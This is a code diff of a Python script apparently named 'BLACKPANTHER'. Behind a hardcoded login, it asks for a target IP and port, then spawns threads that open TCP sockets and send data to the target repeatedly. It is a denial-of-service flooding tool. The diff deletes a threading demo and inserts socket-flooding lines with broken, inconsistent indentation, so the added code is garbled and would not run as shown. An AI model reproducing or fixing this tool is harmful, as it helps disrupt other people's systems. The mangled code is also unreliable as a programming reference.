@@ -53,14 +53,13 @@ while attemps < 100:
     password = input("\033[94mEnter your password: \033[0m")
 
     if username == 'n0lk0ma' and password == 'n0lk0ma':
-        print("***Hai...kamu berhasil login di BLACKPANTHER!!***")
+        print("Hai...kamu berhasil login di BLACKPANTHER!!")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
         attemps += 1
         continue
 os.system("clear")
-
 
 ip = str(input("\033[96m Target IP : \033[0m"))
 port = int(input("\033[92m Target Port : \033[0m"))
@@ -81,38 +80,12 @@ def run():
 			print("[-] \033[97mError!!!\033[0m")
 
 def thread_function(name):
-    logging.info("Thread %s: starting", name)
-    time.sleep(2)
-    logging.info("Thread %s: finishing", name)
-
-if __name__ == "__main__":
-    format = "%(asctime)s: %(message)s"
-    logging.basicConfig(format=format, level=logging.INFO,
-                        datefmt="%H:%M:%S")
-
-    threads = list()
-    for index in range(3):
-        logging.info("Main    : create and start thread %d.", index)
-        x = threading.Thread(target=thread_function, args=(index,) ,  daemon=True)
-        threads.append(x)
-        x.start()
-
-    for index, thread in enumerate(threads):
-        logging.info("Main    : before joining thread %d.", index)
-        thread.join()
-        logging.info("Main    : thread %d done", index)
-	
-
-for y in range(threads):
-	if choice == 'y':
-		th = threading.Thread(target = run)
-		th.start()
-		th = threading.Thread(target = run2)
-		th.start()
-		th = threading.Thread(target = run3)
-		th.start()
-else:
-		th = threading.Thread(target = run4)
-		th.start()
-
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			logging.info("Thread %s: starting", name)
+                        time.sleep(2)
+                        logging.info("Thread %s: finishing", name)
 
